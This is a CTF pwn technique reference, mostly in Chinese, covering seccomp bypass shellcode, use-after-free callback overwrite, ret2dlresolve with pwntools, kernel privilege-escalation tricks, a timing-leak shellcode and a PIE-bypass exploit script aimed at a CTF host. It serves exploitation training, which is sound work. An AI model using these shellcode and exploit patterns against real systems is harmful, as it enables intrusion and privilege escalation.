# CTF Pwn - Advanced Techniques

## Table of Contents
- [Seccomp Advanced Techniques](#seccomp-advanced-techniques)
  - [openat2 Bypass (New Age Pattern)](#openat2-bypass-new-age-pattern)
  - [Conditional Buffer Address Restrictions](#conditional-buffer-address-restrictions)
  - [Shellcode Construction Without Relocations (pwntools)](#shellcode-construction-without-relocations-pwntools)
  - [Seccomp Analysis from Disassembly](#seccomp-analysis-from-disassembly)
- [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
- [Use-After-Free (UAF) Exploitation](#use-after-free-uaf-exploitation)
- [JIT Compilation Exploits](#jit-compilation-exploits)
- [Esoteric Language GOT Overwrite](#esoteric-language-got-overwrite)
- [Heap Overlap via Base Conversion](#heap-overlap-via-base-conversion)
- [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
- [ret2dlresolve](#ret2dlresolve)
- [Kernel Exploitation](#kernel-exploitation) (basic; see [kernel.md](kernel.md) for full coverage)
- [9-Byte test+je Timing Leak (hxp 2018)](#9-byte-testje-timing-leak-hxp-2018)
- [RtlCaptureContext Deterministic Windows Stack Leak (Insomnihack 2017)](#rtlcapturecontext-deterministic-windows-stack-leak-insomnihack-2017)
- [IEEE 754 Double-as-Shellcode via Exponent Fixing (Kaspersky 2018)](#ieee-754-double-as-shellcode-via-exponent-fixing-kaspersky-2018)
- [PIE Bypass via Consistent glibc Load Base 0x56555000 (TAMUctf 2019)](#pie-bypass-via-consistent-glibc-load-base-0x56555000-tamuctf-2019)

**See also:** [heap-techniques.md](heap-techniques.md) — House of Apple 2、House of Einherjar、House of Orange/Spirit/Lore/Force、heap grooming、自定义分配器利用（nginx、talloc）、经典 unlink、musl libc heap、tcache stashing unlink

---

## Seccomp Advanced Techniques

### openat2 Bypass (New Age Pattern)

`openat2`（syscall 437，Linux 5.6+）经常被 seccomp 过滤器漏掉，即使它已经拦了 `open`/`openat`：
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

### Conditional Buffer Address Restrictions

seccomp 可能对缓冲区地址加 `SCMP_CMP_LE`/`SCMP_CMP_GE` 条件：
- `read()`：若 `buf <= code_region + X` 就 KILL -> 必须读到高地址
- `write()`：若 `buf >= code_region + Y` 就 KILL -> 必须从低地址写出

**绕过：** 先读到允许区域，再用 `rep movsb` 复制到另一个允许写出的区域：
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

### Shellcode Construction Without Relocations (pwntools)

pwntools 的 `asm()` 在存在前向 label 引用时可能失败。可手工用 jmp/call 解决：

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

### Seccomp Analysis from Disassembly

```c
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` 结构：`arg`（+0x00, uint）、`op`（+0x04, int）、`datum_a`（+0x08, u64）、`datum_b`（+0x10, u64）

SCMP_CMP 操作符：`NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

默认动作 `0x7fff0000` = `SCMP_ACT_ALLOW`

---

## rdx Control in ROP Chains

完整说明与代码示例见 [rop-and-shellcode.md](rop-and-shellcode.md#rop-链中-rdx-控制)。

---

## Use-After-Free (UAF) Exploitation

**模式：** 菜单题中的 create/delete/view；`free()` 后指针未置空。

**经典 UAF 流程：**
1. 创建对象 A（分配包含函数指针的 chunk）
2. 通过 inspect/view 泄漏地址（绕过 PIE）
3. 释放对象 A（留下悬空指针）
4. 分配同尺寸对象 B（tcache 复用同一个已释放 chunk）
5. 用对象 B 的数据覆写 A 的函数指针为 `win()`
6. 触发 A 的回调 -> 跳到 `win()`

**核心点：** 两个结构体必须同尺寸，才能让 tcache 复用同一 chunk。

```python
create_report("sighting-0")  # 64-byte struct with callback ptr at +56
leak = inspect_report(0)      # Leak callback address for PIE bypass
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)              # Free chunk, dangling pointer remains
create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
analyze_report(0)             # Calls dangling pointer -> win()
```

---

## JIT Compilation Exploits

**模式（Santa's Christmas Calculator）：** 指令编码中的 off-by-one 导致生成的机器码错位。

**利用流程：**
1. 找到触发错误编码形式的边界值（如 128 对比 127）
2. 错位后的字节会被当成可执行指令
3. 控制 `rax` 避免非法解引用（指向可写内存）
4. 将 shellcode 编进减法指令的操作数字节
5. 用 2 字节 `jmp` 在多个 4 字节 shellcode 块之间跳转

**2 字节指令技巧：**
- `push rdx; pop rsi` = 2 字节版 `mov rsi, rdx`
- `xor eax, eax` = 2 字节（设 syscall 号）
- `not dl` = 2 字节（调整指针）
- 先用 `sys_read` 拉完整 shellcode 到 RWX 页，再跳过去

## Esoteric Language GOT Overwrite

**模式（Pikalang）：** Brainfuck/Pikalang 解释器的 tape 无边界，可实现相对任意内存访问。

**利用：**
1. Tape 指针从已知 buffer 地址开始
2. 向前/后移动指针，定位到 GOT（例如 `strlen@GOT`）
3. 逐字节把 GOT 项改成 `system()` 地址
4. 下次调用被改写函数时，执行 `system(controlled_string)`

**核心点：** 无边界 tape 本质就是相对于 buffer 基址的任意读写原语。

## Heap Overlap via Base Conversion

**模式（Santa's Base Converter）：** 同一个数字在不同进制下字符串长度不同。

**利用：**
1. 先以表示更短的进制保存数字（如 base-36）
2. 再转成表示更长的进制（如 base-2）
3. 更长的字符串溢出到相邻堆块元数据
4. 破坏 chunk 后制造与目标分配的重叠

**受限字符集：** 只能写 `0-9a-z`，意味着可控字节值集合受限。

## Tree Data Structure Stack Underallocation

**模式（Christmas Trees）：** 非平衡二叉树导致栈缓冲区“少分配”。

**漏洞：** 栈分配按平衡树假设（`2^depth` 个节点）计算，但真实遍历的非平衡树会占用更多栈空间，最终覆盖返回地址。

**利用：** 构造使遍历过程越界的树结构 -> 覆写返回地址 -> ret2win（若启用 PIE，通常做部分覆写）。

---

## ret2dlresolve

**模式：** 伪造 `Elf64_Sym` 和 `Elf64_Rela` 结构，欺骗动态链接器在下一次 PLT 调用时解析任意函数（例如 `system`）。无需任何 libc 泄漏即可绕过 ASLR。

```python
from pwn import *

# pwntools has built-in ret2dlresolve support
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)  # Read forged structures to known address
rop.ret2dlresolve(dlresolve)       # Trigger resolution

# Stage 1: Send ROP chain
io.sendline(flat({offset: rop.chain()}))

# Stage 2: Send forged dl-resolve payload
io.sendline(dlresolve.payload)
```

**手工方式（理解内部机制）：**
```python
# Forge at a writable address (e.g., .bss)
# 1. Fake Elf64_Rela: points PLT slot to our fake Elf64_Sym
# 2. Fake Elf64_Sym: st_name offset points to our "system" string
# 3. "system\x00" string

SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate reloc_index so PLT stub pushes correct index
reloc_index = (fake_rela_addr - JMPREL) // 0x18  # sizeof(Elf64_Rela)

# Fake Elf64_Sym.st_name = offset from STRTAB to our "system" string
fake_sym_st_name = fake_string_addr - STRTAB
```

**核心点：** ret2dlresolve 完全不依赖泄漏。它利用 lazy binding 机制：PLT 第一次调用某个符号时，动态链接器会去解析名字。只要把解析结构伪造成你想要的，就能让其解析任意 libc 符号。实际题里优先用 pwntools 的 `Ret2dlresolvePayload`。

**要求：** Partial RELRO（Full RELRO 会在加载时就解析完所有符号，破坏该技巧）。还需要一块可写内存存放伪造结构。

---

## Kernel Exploitation

完整内核利用技巧见 [kernel.md](kernel.md)。这里仅做速查：

- 覆写 `modprobe_path` 获取 root 代码执行（需要 AAW）
- 通过伪造 vtable + 栈迁移，利用 `tty_struct` 做 kROP
- 用 `userfaultfd` 稳定竞争条件
- 通过 `tty_struct`、`poll_list`、`user_key_payload`、`seq_operations` 做堆喷
- KASLR/FGKASLR/SMEP/SMAP/KPTI 绕过
- 内核配置侦察清单

**基础模式（贴近用户态）：**
- 利用有漏洞的 `lseek` handler 做 OOB
- 用 fork 出来的多个进程做 heap grooming
- 借助内核到用户态的缓冲区溢出攻击 SUID 二进制
- 检查内核配置中是否禁用保护：
  - `CONFIG_SLAB_FREELIST_RANDOM=n` -> 堆块分配顺序可预测
  - `CONFIG_SLAB_MERGE_DEFAULT=n` -> 分配行为更稳定

---

## 9-Byte test+je Timing Leak (hxp 2018)

**模式：** shellcode 插槽只有 9 字节，装不下完整读写逻辑。可写一个 7 字节的 `test BYTE PTR [rip+0x2], imm8`，再接 2 字节 `je 0`（零标志时死循环）。通过调整 `imm8` 来逐位测试 flag 字节，然后断开连接并测 RTT：`<2 s` 表示崩溃（bit 与 imm 不同），`>2 s` 表示挂住（匹配，触发循环）。

```asm
f6 05 02 00 00 00 X    test BYTE PTR [rip+0x2], X
74 fe                  je   0
```

**核心点：** 即使 shellcode 预算极小，也能把“死循环/崩溃”变成 1 bit 信道来外带完整 flag。任何一边挂起、一边崩溃的分支都能这样利用。

**References:** hxp CTF 2018 — yunospace, writeup 12570

---

## RtlCaptureContext Deterministic Windows Stack Leak (Insomnihack 2017)

**模式：** Windows 上需要栈地址泄漏，但没有格式串。`ntdll!RtlCaptureContext(&ctx)` 会把当前寄存器集（包括 `Rsp`）写到用户提供的 `CONTEXT` 结构里。只要从可控代码调用一次，再读出 `ctx.Rsp` 即可。

```c
CONTEXT ctx;
RtlCaptureContext(&ctx);
printf("rsp = %p\n", (void*)ctx.Rsp);
```

**核心点：** Windows NT API 中存在一些为异常处理和栈展开设计的“导出寄存器状态”辅助函数。利用中它们天然就是确定性信息泄漏原语，因为会把 `RSP` 原样复制到用户内存。

**References:** Insomnihack 2017 — winworld, writeup 12876

---

## IEEE 754 Double-as-Shellcode via Exponent Fixing (Kaspersky 2018)

**模式：** 题目只允许往缓冲区写 6 个 8 字节 IEEE 754 double，然后执行 `(d1 + d2 + d3 + d4 + d5 + d6) / 6` 的结果。若把每个数的指数位固定成 `0x4330`（即 `1075 = 1023 + 52`），就会得到可精确表示的 52 位整数，此时 double 加法等价于整数加法，无舍入误差。于是可把目标 shellcode 视为整数编码进各个 double，再选 `d6` 补足总和。

```python
def shellcode_to_double(bytes_):
    # Pin exponent so the payload bits are preserved
    return struct.unpack('d', b'\x30\x43' + bytes_[:6])[0]

d1 = shellcode_to_double(sc[ 0: 6])
d2 = shellcode_to_double(sc[ 6:12])
d3 = shellcode_to_double(sc[12:18])
d4 = shellcode_to_double(sc[18:24])
d5 = shellcode_to_double(sc[24:30])
# d6 chosen so 6*target == d1+d2+d3+d4+d5+d6
target_int = int_from_shellcode(sc_full)
d6 = 6*target_int - (d1_int + d2_int + d3_int + d4_int + d5_int)
```

**核心点：** 指数位固定在 `bias + 52` 时，IEEE 754 double 就是无损整数容器。于是“只能写 N 个 double”就等价于“能写 N×6 字节的原始数据”，只要你能控制指数位。32 位 float（`bias + 23`）和 long double 也有类似技巧。

**References:** Kaspersky Industrial CTF 2018 — doubles, writeups 12324, 12326

---

## PIE Bypass via Consistent glibc Load Base 0x56555000 (TAMUctf 2019)

**模式（pwn2）：** 32 位 ELF 启用了 PIE，但没有泄漏原语。栈上的函数指针会在 `strcpy` 把用户输入复制到 30 字节缓冲区后被调用；覆写它即可跳到任意代码地址，但随机基址本应阻止直接跳 `print_flag`。观察发现：在题目运行环境中（以及许多 i386 PIE 默认 glibc 配置下），加载器每次都把可执行文件映射到固定基址 `0x56555000`。于是 PIE 实际上退化成固定偏移：`print_flag = 0x56555000 + 0x6dc`，不需要任何泄漏。

```python
# `gdb -q ./pwn2` -> `info proc mappings`
# 0x56555000 0x56556000 0x1000    0x0 ./pwn2
# 0x56556000 0x56557000 0x1000    0x0 ./pwn2
# print_flag symbol offset: 0x6dc

from pwn import *

PIE_BASE = 0x56555000
print_flag = PIE_BASE + 0x6dc

payload  = cyclic(30)           # buffer(30) -> reaches the fn pointer slot
payload += p32(print_flag)      # overwrite var_C called after strcmp
io = remote('pwn.tamuctf.com', 4322)
io.sendline(payload)
io.interactive()
```

**核心点：** 某些发行版上的 32 位 PIE 随机化熵极低，默认 `mmap_base` 甚至会稳定在 `0x56555000`。在真正假设“必须泄漏”之前，先看几轮 `info proc mappings`，确认基址是否其实是常数。类似现象也可能出现在 `ulimit -s unlimited` 启动的栈映射中。

**References:** TAMUctf 2019 — pwn2, writeup 13423
